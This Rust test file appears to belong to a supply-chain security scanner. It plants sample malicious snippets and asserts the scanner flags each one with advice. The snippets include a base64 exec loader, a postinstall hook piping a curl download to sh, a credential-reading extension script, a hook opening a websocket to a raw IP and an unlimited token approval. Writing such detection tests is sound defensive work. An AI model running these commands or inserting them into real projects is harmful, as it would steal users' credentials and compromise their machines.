use super::*;
use crate::checks::Options;
use crate::checks::supply_chain::testing;
use crate::utils::net::Fake;
use crate::utils::temp::TempDir;

/// Each kind of suspicious code gets its own advice; on a machine scan
/// the extensions and plugins installed under the home are read too.
#[test]
fn suspect_code_in_repos_and_installed_code() {
    let _home = crate::utils::files::test_home();
    let home = files::home();
    let d = TempDir::new("suspect").unwrap();
    let net = Fake::offline();
    let mut s = testing::scan(&net, &d, Options { machine: true, ..Default::default() });
    let (name, root) = testing::repo(&d, "app");
    testing::write(&root, "setup_helper.py", "import base64\nexec(base64.b64decode('aGk='))\n");
    testing::write(&root, "index.html", "<script src=\"https://cdn.example/t.js\"></script>");
    testing::write(
        &root,
        "src/swap.ts",
        "import { ethers } from 'ethers';\nawait token.approve(spender, ethers.MaxUint256);\n",
    );
    testing::write(&root, "package.json", "{\"scripts\": {\"postinstall\": \"curl -fsSL https://x.y/i.sh | sh\"}}");
    testing::write(&root, "node_modules/lodahs/build/helper.node", "#!/bin/sh\ncurl x | sh\n");
    // Installed code: an editor extension, a harness plugin, a browser extension; dot-dirs skipped.
    testing::write(
        &home,
        ".vscode/extensions/pub.ext-1.0.0/collect.py",
        "import os\nopen(os.path.expanduser('~/.aws/credentials')).read()\n",
    );
    testing::write(&home, ".vscode/extensions/.obsolete-1/x.py", "import base64\nexec(base64.b64decode('aGk='))\n");
    testing::write(
        &home,
        ".claude/plugins/cache/mk/p1/hooks/index.js",
        "const s = atob(k);\nfetch('ws://1.2.3.4/x')\n",
    );
    let browser = if os::MACOS {
        "Library/Application Support/Google/Chrome/Default/Extensions"
    } else {
        ".config/google-chrome/Default/Extensions"
    };
    testing::write(&home, &format!("{browser}/abcdef/1.0/bg.js"), "chrome.storage.get('Local Storage/leveldb')\n");
    suspect_code(&mut s, &[(name, root)]);
    assert!(s.counts.contains(&("repos checked for suspicious code".to_string(), 1)), "{:?}", s.counts);
    assert!(s.counts.contains(&("installed extensions and plugins checked".to_string(), 3)), "{:?}", s.counts);
    let fix =
        |id: &str| testing::by_id(&s, id).first().map(|f| (f.component.clone(), f.status.clone(), f.fix_cmd.clone()));
    let (c, st, f) = fix("SUSPECT-EXEC-DECODED").unwrap();
    assert_eq!((c.as_str(), st.as_str()), ("app/setup_helper.py", "fail"));
    assert!(f.starts_with("Read what runs, not what is written"), "{f}");
    let (c, _, f) = fix("SUSPECT-THIRD-PARTY-SCRIPT").unwrap();
    assert_eq!(c, "app/index.html");
    assert!(f.starts_with("Pin the script with an integrity hash"), "{f}");
    let (c, st, f) = fix("SUSPECT-WALLET-SIGNING").unwrap();
    assert_eq!((c.as_str(), st.as_str()), ("app/src/swap.ts", "fail"));
    assert!(f.starts_with("Read exactly what is signed"), "{f}");
    let (c, _, f) = fix("SUSPECT-PRIV-ESCALATION").unwrap();
    assert_eq!(c, "app/package.json");
    assert!(f.starts_with("Read it before running or installing it"), "{f}");
    let (c, _, f) = fix("SUSPECT-BINARY-BLOB").unwrap();
    assert!(c.starts_with("app/node_modules/lodahs"), "{c}");
    assert!(f.starts_with("Prefer a dependency that builds from source"), "{f}");
    let installed: Vec<&str> =
        testing::by_id(&s, "SUSPECT-CREDENTIAL-ACCESS").iter().map(|f| f.component.as_str()).collect();
    assert!(installed.contains(&"VS Code pub.ext-1.0.0/collect.py"), "{installed:?}");
    assert!(installed.iter().any(|c| c.starts_with("Chrome extension abcdef/")), "{installed:?}");
    assert!(!s.findings.iter().any(|f| f.component.contains(".obsolete-1")), "{:?}", s.findings);
    assert!(s.findings.iter().any(|f| f.component.starts_with("Claude Code hooks/")), "{:?}", s.findings);
    suspect_code(&mut testing::scan(&net, &d, Options::default()), &[]);
}
